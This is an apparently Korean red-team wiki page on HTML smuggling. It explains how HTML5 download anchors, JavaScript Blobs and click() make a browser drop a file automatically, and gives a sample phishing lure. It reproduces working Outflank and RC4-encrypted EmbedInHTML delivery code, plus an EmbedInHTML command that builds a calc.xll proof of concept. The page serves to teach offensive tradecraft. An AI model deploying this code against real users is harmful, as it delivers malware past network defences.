# HTML 스머글링 (Smuggling)

출처와 중요 레퍼런스 - [https://outflank.nl/blog/2018/08/14/html-smuggling-explained/](https://outflank.nl/blog/2018/08/14/html-smuggling-explained/)

HTML 스머글링 (HTML Smuggling)은 자바스크립트와 HTML5의 download, anchor, click 등의 특성을 이용해 유저가 특정 HTML 페이지를 방문시 자동으로 파일을 다운 받도록 하는 기법이다.

1. HTML5 anchor 태그에는 download 라는 특성이 있다. 이 특성은 anchor 태그에 URL 형식으로 링크된 파일을 클라이언트가 다운로드 받도록 한다.
2. 자바스크립트의 Javascript Blob은 raw 데이터를 octet/stream 형태로 저장할 수 있게 해준다. 그 뒤 이 데이터는 createObjectURL을 통해 URL 형식으로 anchor 태그에 링크 될 수 있다.
3. 자바스크립트의 HTMLElement.click 함수는 anchor 태그에 링크된 파일을 자동으로 클릭해 다운로드 받게 한다.

위 3가지를 모두 합치면 HTML 페이지를 방문만 해도 페이로드가 다운로드 되도록 할 수 있다. HTML 스머글링은 다른 초기 침투 페이로드와 같이 사용되어 클라이언트의 디스크에 maldoc, XLL, DLL, HTA, JScript, ISO, ZIP 등의 파일들이 다운로드 되도록 한다.

고급화된 피싱 공격에서는 다음과 같이 HTML 스머글링을 이용하기도 한다.

* "<회사> 징계위원회입니다. 귀하와 관련된 익명의 신고가 접수되었으니 안전한 문서 접근을 위해 Safe URL 으로 가서 passcode: 1234를 입력한 뒤, 징계 문서를 확인주세요 -> \<HTML Smuggling 페이지 링크>"
* 피해자가 링크 클릭 -> HTML Smuggling 으로 문서 다운로드
* 문서를 여는 순간 페이로드 실행

### 장점

HTML 스머글링의 장점은 바로 호스트와 방어 기술들의 입장에서는 의심될만한 것이 많이 없다는 것이다. 아래는 Outflank 사의 블로그 포스트에서 가져온 이미지다:

![https://outflank.nl/blog/2018/08/14/html-smuggling-explained/](<../.gitbook/assets/image (28).png>)

타겟의 프록시/방화벽의 입장에서는 피해자 호스트가 단순한 HTML 페이지를 방문하는 것처럼 보인다. MIME Type도 text/html밖에 없고, 로드되는 코드들도 클라이언트-사이드의 자바스크립트 밖에 없다. 요새 자바스크립트 없는 웹 페이지가 없다보니 이상한 점은 없어보인다.

브라우저의 입장에서도 단순한 HTML과 자바스크립트가 로드되다보니 이상한 점은 없다. 브라우저는 HTML5와 자바스크립트의 기본적인 함수들을 이용해 하라는대로, 파일을 다운로드 한다.

### 코드

기본적인 코드는 base64 스트링을 디코딩해 Javascript blob로 만들고, 이를 anchor 태그에 URL 형식으로 걸어놓은 뒤 HTMLElement.click() 함수를 이용해 이를 다운 받는 코드다.

<details>

<summary>Outflank blog source code</summary>

```
function base64ToArrayBuffer(base64) {
  var binary_string = window.atob(base64);
  var len = binary_string.length;
  var bytes = new Uint8Array( len );
  for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
  return bytes.buffer;
}

var file ='<< BASE64 ENCODING OF MALICIOUS FILE >>';
var data = base64ToArrayBuffer(file);
var blob = new Blob([data], {type: 'octet/stream'});
var fileName = 'outflank.doc';

if(window.navigator.msSaveOrOpenBlob) window.navigator.msSaveBlob(blob,fileName);
else {
  var a = document.createElement('a');
  document.body.appendChild(a);
  a.style = 'display: none';
  var url = window.URL.createObjectURL(blob);
  a.href = url;
  a.download = fileName;
  a.click();
  window.URL.revokeObjectURL(url);
}
```

`base64ToArryBuffer` 함수를 이용해 base64 인코딩된 문자열을 ArrayBuffer 로 만든 뒤, 이를 new Blob 에다가 넣어 자바스크립트 데이터 Blob를 생성한다.

그 뒤 anchor 태그를 생성하고, `var url = window.URL.createObjectURL(blob)` 을 이용해 anchor 태그에 위에서 만든 Blob를 걸어준 뒤, `a.download` 및 `a.click` 으로 클라이언트 브라우저가 자동으로 파일을 다운받도록 한다.

</details>

위에서 살펴본 코드도 좋지만, 작전보안을 위해 파일을 암호화 한 뒤, 클라이언트 브라우저가 다운 받는 런타임 도중 복호화 해 다운 받도록 암호화를 추가하는 방법도 있다.

<details>

<summary>EmbedinHTML - AES Encryption</summary>

```
function rc4Function(r,o){for(var t,e=[],n=0,a="",f=0;f<256;f++)e[f]=f;for(f=0;f<256;f++)n=(n+e[f]+r.charCodeAt(f%r.length))%256,t=e[f],e[f]=e[n],e[n]=t;f=0,n=0;for(var h=0;h<o.length;h++)n=(n+e[f=(f+1)%256])%256,t=e[f],e[f]=e[n],e[n]=t,a+=String.fromCharCode(o.charCodeAt(h)^e[(e[f]+e[n])%256]);return a;}
function b64AndRC4Function(r,o){var s=[],j=0,x,res='';for(var i=0;i<256;i++)s[i]=i;for(i=0;i<256;i++)j=(j+s[i]+r.charCodeAt(i%r.length))%256,x=s[i],s[i]=s[j],s[j]=x;i=0;j=0;var data=atob(o);var dataLength=data.length;var array=new Uint8Array(new ArrayBuffer(dataLength));for(var y=0;y<dataLength;y++)i=(i+1)%256,j=(j+s[i])%256,x=s[i],s[i]=s[j],s[j]=x,array[y]=data.charCodeAt(y)^s[(s[i]+s[j])% 256];return array;}

var keyFunction = function(){return "test"};

var varPayload = "<base64ed-file-string>";

var varBlob = new Blob([b64AndRC4Function(keyFunction(), varPayload)], {type: "application/vnd.ms-excel"});
var varBlobShim = '(function(b,fname){if(window.navigator.msSaveOrOpenBlob)window.navigator.msSaveOrOpenBlob(b,fname);else{var a=window.document.createElement("a");a.href=window.URL.createObjectURL(b, {type:"application/vnd.ms-excel"});a.download=fname;document.body.appendChild(a);a.click();document.body.removeChild(a);}})';
setTimeout(varBlobShim+'(varBlob, "calc.xll")');
```

</details>

암호화 함수들인 `rc4Function` 과 `b64AndRC4Function` 을 추가한다. 그 뒤, keyFunction 에서 간단한 암호화 키인 "test" 를 지정한다. 이후 암호화되어 있던 `varPayload` 를 `b64AndRC4Function` 으로 복호화 한다. 그 뒤, `varBlobShim` 에서는 위 OutFlank 소스코드에 있던 anchor 태그, Download 특성, createObjectURL 등을 추가하는 자바스크립트 함수를 만든다. 그 뒤, 이를 실행하면 런타임 중 복호화를 진행한 뒤 파일을 다운받게 된다.

### 실습

실습에서는 EmbedinHTML 툴을 사용한다. 오래된 툴이라 파이썬 2.7을 사용해야한다. PoC를 위해 기본 코드 실행인 계산기를 실행하는 페이로드를 이용한다.

```
python2.7 embedInHTML.py -f ./payloads_examples/calc.xll -o test.html -w -k testkey
```

![](<../.gitbook/assets/htmlsmuggling-demo2 (1).gif>)

### 레퍼런스

{% embed url="https://outflank.nl/blog/2018/08/14/html-smuggling-explained/" %}

{% embed url="https://github.com/Arno0x/EmbedInHTML" %}
